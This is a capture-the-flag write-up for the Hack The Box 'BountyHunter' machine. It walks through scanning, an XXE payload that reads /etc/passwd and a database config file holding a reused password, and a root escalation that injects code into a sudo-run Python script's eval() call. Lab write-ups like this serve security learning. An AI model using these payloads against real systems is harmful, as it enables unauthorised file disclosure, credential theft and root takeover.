# [bounty-hunter](https://app.hackthebox.eu/machines/BountyHunter)


---

## Open Port Discovery

```bash
$ masscan --ports 1-65535 10.10.11.100 --rate=1000 -e tun0 --output-format grepable --output-filename bounty-hunter.masscan
$ cat bounty-hunter.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

Port 22 (SSH) and port 80 (HTTP) are open.

---

## Open Port Enumeration

```bash
$ nmap -sC -sV -O -p22,80 10.10.11.100 -oA bounty-hunter
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 19:26 CDT
Nmap scan report for 10.10.11.100
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 - 5.3 (95%), Linux 4.15 - 5.6 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

The OpenSSH string indicates the target is Ubuntu 20.04.

---

## Web Application Enumeration

### Content Discovery

```bash
$ gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/09/05 20:57:09 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.html.php            (Status: 403) [Size: 277]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/index.php            (Status: 200) [Size: 25169]
/.htm                 (Status: 403) [Size: 277]
/.htm.php             (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/db.php               (Status: 200) [Size: 0]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/.                    (Status: 200) [Size: 25169]
/portal.php           (Status: 200) [Size: 125]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.phtml               (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
/.htc.php             (Status: 403) [Size: 277]
/.html_var_DE         (Status: 403) [Size: 277]
/.html_var_DE.php     (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.html.               (Status: 403) [Size: 277]
/.html..php           (Status: 403) [Size: 277]
/.html.html           (Status: 403) [Size: 277]
/.html.html.php       (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htpasswds.php       (Status: 403) [Size: 277]
/.htm.                (Status: 403) [Size: 277]
/.htm..php            (Status: 403) [Size: 277]
/.htmll               (Status: 403) [Size: 277]
/.phps                (Status: 403) [Size: 277]
/.htmll.php           (Status: 403) [Size: 277]
/.html.old            (Status: 403) [Size: 277]
/.html.old.php        (Status: 403) [Size: 277]
/.ht.php              (Status: 403) [Size: 277]
/.html.bak.php        (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
/.html.bak            (Status: 403) [Size: 277]
/.htm.htm             (Status: 403) [Size: 277]
/.htm.htm.php         (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/.html1               (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htgroup.php         (Status: 403) [Size: 277]
/.html1.php           (Status: 403) [Size: 277]
/.html.LCK            (Status: 403) [Size: 277]
/.html.printable      (Status: 403) [Size: 277]
/.html.LCK.php        (Status: 403) [Size: 277]
/.html.printable.php  (Status: 403) [Size: 277]
/.htm.LCK             (Status: 403) [Size: 277]
/.htm.LCK.php         (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.html.php            (Status: 403) [Size: 277]
/.htmls               (Status: 403) [Size: 277]
/.htx                 (Status: 403) [Size: 277]
/.htaccess.bak.php    (Status: 403) [Size: 277]
/.htmls.php           (Status: 403) [Size: 277]
/.html.php.php        (Status: 403) [Size: 277]
/.htx.php             (Status: 403) [Size: 277]
/.htlm                (Status: 403) [Size: 277]
/.htm2.php            (Status: 403) [Size: 277]
/.html-               (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/.htlm.php            (Status: 403) [Size: 277]
/.htm2                (Status: 403) [Size: 277]
/.html-.php           (Status: 403) [Size: 277]
/.htuser.php          (Status: 403) [Size: 277]

===============================================================
2021/09/05 21:03:16 Finished
===============================================================
```

Interesting file: `db.php`.

---

### Developer Notes

![](images/Pasted%20image%2020210905222727.png)

---

### Manual Enumeration

Information web page for a group of bug bounter hunters: "The B Team."

![](images/Pasted%20image%2020210905204255.png)

Theme is from https://github.com/jeromelachaud/freelancer-theme.

#### About Section

Brief description of the bug bounty team. Mentions work with BurpSuite and buffer overflows.

#### Contact Form

Form for clients to express interest in the bug bounty team. The form doesn't submit anywhere.

#### Portal: `/portal.php`

![](images/Pasted%20image%2020210905205321.png)

Follow the link to the bounty tracker.

#### Bounty Tracker: `/log_submit.php`

Form for entering bug bounties that the team has submitted.

![](images/Pasted%20image%2020210905212607.png)

When the form is submitted, it executes the JavaScript `bountySubmit()` function.

```javascript
// bountylog.js
async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

`bountySubmit()` calls the `returnSecret()` function.

```javascript
// bountylog.js
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}
```

Submitting the form causes the application to build an XML document with the input data. The XML document is sent via an HTTP `POST` to `/tracker_diRbPr00f314.php`.

```http
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 225
Origin: http://10.10.11.100
DNT: 1
Connection: close
Referer: http://10.10.11.100/log_submit.php
Sec-GPC: 1

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5vbmU8L3RpdGxlPgoJCTxjd2U%2BdHdvPC9jd2U%2BCgkJPGN2c3M%2BdGhyZWU8L2N2c3M%2BCgkJPHJld2FyZD5mb3VyPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
```

Body URL and base64 decoded:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
	<title>one</title>
	<cwe>two</cwe>
	<cvss>three</cvss>
	<reward>four</reward>
</bugreport>
```

The response indicates that the application, if the database were ready, would add the bounty submission to the database.

```http
HTTP/1.1 200 OK
Date: Mon, 06 Sep 2021 01:18:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 263
Connection: close
Content-Type: text/html; charset=UTF-8

If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>one</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>two</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>three</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>four</td>
  </tr>
</table>
```

![](images/Pasted%20image%2020210905212139.png)

---

## Exploit XXE Vulnerability for User Access

Since the `bountySubmit()` function directly embeds user input into the XML document, it could be vulnerable to an XXE injection. Base64-, URL-encode, and submit the following payload to read `/etc/passwd`.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<bugreport>
    <title>&xxe;</title>
    <cwe>two</cwe>
    <cvss>three</cvss>
    <reward>four</reward>
</bugreport>
```

The request:

```http
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 361
Origin: http://10.10.11.100
DNT: 1
Connection: close
Referer: http://10.10.11.100/log_submit.php
Sec-GPC: 1

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGZvbyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L2V0Yy9wYXNzd2QiPiBdPgo8YnVncmVwb3J0PgogICAgPHRpdGxlPiZ4eGU7PC90aXRsZT4KICAgIDxjd2U%2BdHdvPC9jd2U%2BCiAgICA8Y3Zzcz50aHJlZTwvY3Zzcz4KICAgIDxyZXdhcmQ%2BZm91cjwvcmV3YXJkPgo8L2J1Z3JlcG9ydD4%3D
```

The response:

```http
HTTP/1.1 200 OK
Date: Mon, 06 Sep 2021 02:41:25 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2716
Connection: close
Content-Type: text/html; charset=UTF-8

If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmRldmVsb3BtZW50Ong6MTAwMDoxMDAwOkRldmVsb3BtZW50Oi9ob21lL2RldmVsb3BtZW50Oi9iaW4vYmFzaApseGQ6eDo5OTg6MTAwOjovdmFyL3NuYXAvbHhkL2NvbW1vbi9seGQ6L2Jpbi9mYWxzZQp1c2JtdXg6eDoxMTI6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4K</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>two</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>three</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>four</td>
  </tr>
</table>

```

URL- and base64-decode the injected response.

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Note the `development` user. Now exploit this vulnerability to read `db.php`.

Payload:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
    <title>&xxe;</title>
    <cwe>two</cwe>
    <cvss>three</cvss>
    <reward>four</reward>
</bugreport>
```

Request:

```http
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 373
Origin: http://10.10.11.100
DNT: 1
Connection: close
Referer: http://10.10.11.100/log_submit.php
Sec-GPC: 1

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGZvbyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC9kYi5waHAiPiBdPgo8YnVncmVwb3J0PgogICAgPHRpdGxlPiZ4eGU7PC90aXRsZT4KICAgIDxjd2U%2BdHdvPC9jd2U%2BCiAgICA8Y3Zzcz50aHJlZTwvY3Zzcz4KICAgIDxyZXdhcmQ%2BZm91cjwvcmV3YXJkPgo8L2J1Z3JlcG9ydD4%3D
```

Response:

```http
HTTP/1.1 200 OK
Date: Mon, 06 Sep 2021 02:44:06 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 512
Connection: close
Content-Type: text/html; charset=UTF-8

If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>two</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>three</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>four</td>
  </tr>
</table>
```

Decoded `db.php`:

```php
<?php
	// TODO -> Implement login system with the database.
	$dbserver = "localhost";
	$dbname = "bounty";
	$dbusername = "admin";
	$dbpassword = "m19RoAU0hP41A1sTsq6K";
?>
```

Login via SSH with the credentials `development:m19RoAU0hP41A1sTsq6K` and grab the user flag at `/home/development/user.txt`.

---

## Privilege Escalation Enumeration

### `/home/development/contract.txt`

```txt
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

It appears the B Team has a contract with Skytrain Inc to test one of their internal tools. John has "set up the permissions" for them to test the tool. This is worth investigating. Where is the tool, though?

```bash
$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

It looks like Skytrain's tool is at `/opt/skytrain_inc/ticketValidator.py` and `development` can execute it as `root`. The tool's source code:

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

The application takes in a file path as a parameter, opens the file, and then ensures it represents a valid Skytrain ticket. After some validation, it calls Python's built-in `eval()` function, which can be leveraged to execute an arbitrary Python statement. To achieve this, an input file must be crafted with the correct structure.

The `load_file()` function ensures that the file path ends with `.md`. Thus, the payload file must end in `.md`. It then ensures that the first line begins with `# Skytrain Inc`, the second line begins with `## Ticket to `, and the third line begins with `__Ticket Code__`.

The fourth line is where things get interesting. It must begin with `**`. Then, it is `split()` with a whitespace character as the delimeter and the first token is taken to ensure its remainder after being divided by 7 is four. If it passes this check, all `**` tokens are removed and the entire line is passed to Python's `eval()` function.

A payload file named `tgihf.md` with the following structure will write the root flag to `/dev/shm/tgihf.txt`

```md
# Skytrain Inc
## Ticket to tgihf
__Ticket Code:__
**11+(open('/dev/shm/tgihf.txt', 'w').write(open('/root/root.txt').read()))
```

Execute the program using `sudo` to write the root flag to `/dev/shm/tgihf.txt`.

```bash
$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/dev/shm/tgihf.md
Destination: 
Invalid ticket.
```
